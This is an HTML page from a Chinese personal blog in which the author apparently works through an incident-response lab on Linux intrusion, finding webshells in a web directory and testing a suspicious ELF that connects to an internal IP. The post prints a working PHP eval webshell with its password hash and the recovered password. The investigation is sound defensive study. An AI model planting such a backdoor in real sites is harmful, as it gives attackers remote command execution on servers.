@@ -1,0 +1,177 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>玄机 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-04-20">2025年4月20日</time>
+        
+        
+          <span class="post__readtime">1 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/%E7%8E%84%E6%9C%BA/">#玄机</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">玄机</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <blockquote>
+<p>做一做玄机、 学一学应急。 做了几个突然想起。博客开个贴子记录下来也是挺好的😋</p>
+</blockquote>
+<h2 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h2><ol>
+<li>web目录存在木马，请找到木马的密码提交</li>
+</ol>
+<p>登录上服务器，将web目录打包。下载下来用d盾扫一波</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082118016.png" alt="image-20250408211831936"></p>
+<p><code>1.php</code>内容</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082120365.png" alt="image-20250408212035313"></p>
+<p><code>.shell.php</code>内容</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082121347.png" alt="image-20250408212154309"></p>
+<p><code>index.php</code>内容</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082124197.png" alt="image-20250408212409124"></p>
+<p><code>index.php</code>作用是在 <code>/var/www/html/</code>下生成<code>.shell.php</code>然后在<code>.shell.php</code>中写入<code>&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;</code></p>
+<p>这个马的密码是<code>hello</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082127793.png" alt="image-20250408212732746"></p>
+<p>网站目录下面还有一个 <code>shell(1).elf</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082209209.png" alt="image-20250408220936143"></p>
+<p>放进ida里面看了一下，发现自己根本看不懂<img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082210714.png" alt="image-20250408221017667"></p>
+<p>就起了一个docker 将它在docker里面执行了一下</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082210332.png" alt="image-20250408221050277"></p>
+<p>然后再看网络连接状态<code>netstat -antlp</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504082210385.png" alt="image-20250408221056343"></p>
+<p>连接了<code>10.11.55.21:3333</code></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/05/06/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-awker/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">mazesec-awker</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/04/05/Golang/learn_to_write_a_C2_by_Go/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">learn_to_write_a_C2_by_Go</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
